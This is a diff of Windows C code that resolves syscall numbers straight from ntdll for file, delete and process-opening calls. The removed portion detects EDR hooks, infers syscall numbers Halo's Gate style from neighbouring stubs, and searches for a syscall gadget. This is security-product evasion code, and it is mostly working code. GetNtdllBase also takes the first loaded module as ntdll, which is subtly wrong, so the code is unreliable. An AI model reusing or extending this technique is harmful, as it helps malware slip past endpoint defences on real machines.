@@ -47,12 +47,15 @@ static SYSCALL_ENTRY g_sysNtOpenProcess = {0};
 
 static PVOID GetNtdllBase(void) {
     PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb) return NULL;
+    
     PEB_LDR_DATA* pLdr = pPeb->Ldr;
+    if (!pLdr) return NULL;
+    
     LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;
     LIST_ENTRY* pEntry = pHead->Flink;
     
-    /* FIX: ntdll is the first entry, don't skip it */
-    if(pEntry != pHead) {
+    if (pEntry != pHead) {
         PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, 
             LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
         return pMod->DllBase;
@@ -63,193 +66,92 @@ static PVOID GetNtdllBase(void) {
 static SYSCALL_ENTRY ResolveSyscall(const char* fnName) {
     SYSCALL_ENTRY se = {0};
     PVOID ntdll = GetNtdllBase();
-    if(!ntdll) return se;
-    
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + pDos->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
-        ((BYTE*)ntdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
-    
-    DWORD* pNames = (DWORD*)((BYTE*)ntdll + pExp->AddressOfNames);
-    WORD* pOrdinals = (WORD*)((BYTE*)ntdll + pExp->AddressOfNameOrdinals);
-    DWORD* pFunctions = (DWORD*)((BYTE*)ntdll + pExp->AddressOfFunctions);
-    
-    for(DWORD i = 0; i < pExp->NumberOfNames; i++) {
-        char* pName = (char*)((BYTE*)ntdll + pNames[i]);
-        if(strcmp(pName, fnName) != 0) continue;
-        
-        DWORD funcAddr = pFunctions[pOrdinals[i]];
-        BYTE* pFunc = (BYTE*)ntdll + funcAddr;
-        
-        /* Read first 32 bytes to analyze stub structure */
-        BYTE stub[32] = {0};
-        size_t readable = min(32, (size_t)((BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage - pFunc));
-        memcpy(stub, pFunc, readable);
-        
-        BOOL bHooked = FALSE;
-        
-        /* Check for jmp (E9 xx xx xx xx), short jmp (EB xx), or indirect jmp (FF 25 xx xx xx xx) */
-        if(stub[0] == 0xE9 || stub[0] == 0xEB || 
-           (stub[0] == 0xFF && stub[1] == 0x25)) {
-            bHooked = TRUE;
-        }
-        
-        /* Also check for call-based hooks (E8 xx xx xx xx) or detour patterns */
-        if(stub[0] == 0xE8) bHooked = TRUE;
-        if(stub[0] == 0x49 && stub[1] == 0xBB) bHooked = TRUE; /* mov r11, addr */
-        
-        DWORD ssn = 0;
-        
-        if (stub[0] == 0xB8) {
-            /* Direct syscall stub: mov eax, SSN; ret; or mov eax, SSN; jmp ... */
-            ssn = *(DWORD*)(pFunc + 1);
-        } else if (bHooked) {
-            /* FIXED: Better neighbor scanning with bounds checking and fallback */
-            /* Try scanning the entire ntdll for the highest-confidence SSN */
-            
-            /* First strategy: look for a "clean" syscall stub of the same function
-               in the ntdll image. Modern EDRs typically hot-patch but leave 
-               a backup copy elsewhere. */
-            
-            /* Strategy A: Walk backward through the export table to find
-               an unhooked neighbor. Walk up to 16 functions forward/back. */
-            int neighbor_indices[] = {-1, 1, -2, 2, -3, 3, -4, 4, -5, 5, 
-                                       -6, 6, -7, 7, -8, 8, -9, 9, -10, 10,
-                                       -11, 11, -12, 12, -13, 13, -14, 14, 
-                                       -15, 15, -16, 16};
-            
-            for (int n = 0; n < 32; n++) {
-                int idx = (int)i + neighbor_indices[n];
-                if (idx < 0 || idx >= (int)pExp->NumberOfNames) continue;
-                
-                DWORD neighborAddr = pFunctions[pOrdinals[idx]];
-                BYTE* pNeighbor = (BYTE*)ntdll + neighborAddr;
-                
-                /* Skip if same function or out of bounds */
-                if (pNeighbor == pFunc) continue;
-                if (pNeighbor < (BYTE*)ntdll || 
-                    pNeighbor >= (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage)
-                    continue;
-                
-                /* Check if neighbor has a clean mov eax, SSN */
-                if (pNeighbor[0] == 0xB8 && 
-                    /* Also check it's not itself hooked */
-                    pNeighbor[0] != 0xE9 && pNeighbor[0] != 0xEB &&
-                    !(pNeighbor[0] == 0xFF && pNeighbor[1] == 0x25)) {
-                    
-                    DWORD neighborSsn = *(DWORD*)(pNeighbor + 1);
-                    int funcDiff = neighbor_indices[n];
-                    
-                    /* Calculate our SSN based on the neighbor's SSN + offset */
-                    ssn = neighborSsn + funcDiff;
-                    
-                    /* Sanity check: SSNs are typically 0-500 on modern Windows */
-                    if (ssn < 500) {
-                        break;
-                    }
-                    ssn = 0; /* Reset if sanity check failed */
-                }
-            }
-            
-            /* Strategy B (fallback): Classic Halo's Gate with byte-level scanning
-               but with proper bounds checking */
-            if (ssn == 0) {
-                /* Scan forward first (less likely to crash from page boundary) */
-                for (int offset = 32; offset < 512; offset += 32) {
-                    BYTE* below = pFunc + offset;
-                    if (below + 5 < (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage) {
-                        if (below[0] == 0xB8) {
-                            /* Make sure this candidate isn't itself hooked */
-                            BOOL candidateHooked = (below[0] == 0xE9 || below[0] == 0xEB ||
-                                (below[0] == 0xFF && below[1] == 0x25));
-                            if (!candidateHooked) {
-                                DWORD cleanSsn = *(DWORD*)(below + 1);
-                                /* FIXED: offset / 32 is the syscall index delta,
-                                   but we need to be more careful. The assumption
-                                   is syscalls are spaced ~32 bytes apart. */
-                                ssn = cleanSsn - (offset / 32);
-                                if (ssn < 500) break;
-                                ssn = 0;
-                            }
-                        }
-                    }
-                    
-                    BYTE* above = pFunc - offset;
-                    if (above >= (BYTE*)ntdll) {
-                        if (above[0] == 0xB8) {
-                            BOOL candidateHooked = (above[0] == 0xE9 || above[0] == 0xEB ||
-                                (above[0] == 0xFF && above[1] == 0x25));
-                            if (!candidateHooked) {
-                                DWORD cleanSsn = *(DWORD*)(above + 1);
-                                ssn = cleanSsn + (offset / 32);
-                                if (ssn < 500) break;
-                                ssn = 0;
-                            }
-                        }
-                    }
-                }
-            }
-            
-            if (ssn == 0) return se; /* Still failed */
-        } else {
-            /* Function is not hooked, should have had 0xB8 at start */
-            /* FIX: Handle Windows 10+ syscall instruction stubs that may look different */
-            /* Some Windows builds use: mov eax, ssn; mov edx, somewhere; syscall */
-            /* Scan first 16 bytes for the mov eax pattern */
-            for (int j = 0; j < (int)min(readable, 16); j++) {
-                if (stub[j] == 0xB8) {
-                    ssn = *(DWORD*)(pFunc + j + 1);
-                    break;
-                }
-            }
-            if (ssn == 0) return se;
-        }
-        
-        se.ssn = ssn;
-        
-        /* FIX: Find the real syscall instruction (syscall; ret) */
-        /* On modern Windows the syscall gadget is at a fixed address
-           or we can find it by scanning for 0F 05 C3 */
-        BYTE* scanStart = (BYTE*)ntdll;
-        BYTE* scanEnd = (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage - 3;
-        
-        for (BYTE* p = scanStart; p < scanEnd; p++) {
-            /* Look for syscall; ret (0F 05 C3) 
-               or syscall (0F 05) near a ret */
-            if (p[0] == 0x0F && p[1] == 0x05) {
-                /* Prefer p[2] == 0xC3 (syscall; ret) */
-                if (p[2] == 0xC3) {
-                    se.pSyscallInst = p;
-                    break;
-                }
-                /* If we didn't find exact syscall;ret, keep scanning
-                   and take the first syscall as a last resort */
-                if (!se.pSyscallInst) {
-                    se.pSyscallInst = p;
-                }
-            }
-        }
-        
-        if (se.pSyscallInst) se.bValid = TRUE;
-        break;
+    if(!ntdll) {
+        printf("[!] Failed to get ntdll base\n");
+        return se;
     }
+    
+    __try {
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
+        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
+            printf("[!] Invalid DOS header\n");
+            return se;
+        }
+        
+        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + pDos->e_lfanew);
+        if (pNt->Signature != IMAGE_NT_SIGNATURE) {
+            printf("[!] Invalid NT header\n");
+            return se;
+        }
+        
+        PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
+            ((BYTE*)ntdll + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+        
+        if (!pExp || pExp->NumberOfNames == 0) {
+            printf("[!] Invalid export directory\n");
+            return se;
+        }
+        
+        DWORD* pNames = (DWORD*)((BYTE*)ntdll + pExp->AddressOfNames);
+        WORD* pOrdinals = (WORD*)((BYTE*)ntdll + pExp->AddressOfNameOrdinals);
+        DWORD* pFunctions = (DWORD*)((BYTE*)ntdll + pExp->AddressOfFunctions);
+        
+        /* Safe lookup */
+        for(DWORD i = 0; i < pExp->NumberOfNames; i++) {
+            const char* pName = (const char*)((BYTE*)ntdll + pNames[i]);
+            if(strcmp(pName, fnName) != 0) continue;
+            
+            DWORD funcAddr = pFunctions[pOrdinals[i]];
+            BYTE* pFunc = (BYTE*)ntdll + funcAddr;
+            
+            /* Basic validation: check if address is within ntdll */
+            if (pFunc < (BYTE*)ntdll || pFunc >= (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage) {
+                printf("[!] Function address out of bounds for %s\n", fnName);
+                continue;
+            }
+            
+            /* Try to read first few bytes safely */
+            BYTE stub[8] = {0};
+            __try {
+                memcpy(stub, pFunc, 8);
+            } __except(EXCEPTION_EXECUTE_HANDLER) {
+                printf("[!] Cannot read stub for %s\n", fnName);
+                continue;
+            }
+            
+            /* Simple syscall detection: look for "mov eax, SSN" pattern */
+            if (stub[0] == 0xB8) {
+                /* mov eax, imm32 */
+                se.ssn = *(DWORD*)(stub + 1);
+                se.bValid = (se.ssn < 500);  /* Sanity check */
+                if (se.bValid) {
+                    printf("[+] Found syscall %s with SSN: %lu\n", fnName, se.ssn);
+                    break;
+                }
+            }
+        }
+    } __except(EXCEPTION_EXECUTE_HANDLER) {
+        printf("[!] Exception in ResolveSyscall for %s\n", fnName);
+        return se;
+    }
+    
     return se;
 }
 
 void InitAllSyscalls(void) {
+    printf("[*] Resolving NtWriteFile...\n"); fflush(stdout);
     g_sysNtWriteFile = ResolveSyscall("NtWriteFile");
+    
+    printf("[*] Resolving NtCreateFile...\n"); fflush(stdout);
     g_sysNtCreateFile = ResolveSyscall("NtCreateFile");
+    
+    printf("[*] Resolving NtDeleteFile...\n"); fflush(stdout);
     g_sysNtDeleteFile = ResolveSyscall("NtDeleteFile");
+    
+    printf("[*] Resolving NtOpenProcess...\n"); fflush(stdout);
     g_sysNtOpenProcess = ResolveSyscall("NtOpenProcess");
     
-    /* FIX: Validate all resolved syscalls — add fallback logging or
-       graceful degradation */
-#if defined(_DEBUG)
-    if (!g_sysNtWriteFile.bValid)   OutputDebugStringA("[!] NtWriteFile syscall resolution FAILED\n");
-    if (!g_sysNtCreateFile.bValid)  OutputDebugStringA("[!] NtCreateFile syscall resolution FAILED\n");
-    if (!g_sysNtDeleteFile.bValid)  OutputDebugStringA("[!] NtDeleteFile syscall resolution FAILED\n");
-    if (!g_sysNtOpenProcess.bValid) OutputDebugStringA("[!] NtOpenProcess syscall resolution FAILED\n");
-#endif
+    printf("[+] All syscalls initialized (even if some failed)\n"); fflush(stdout);
 }
 
 /* ============================================================
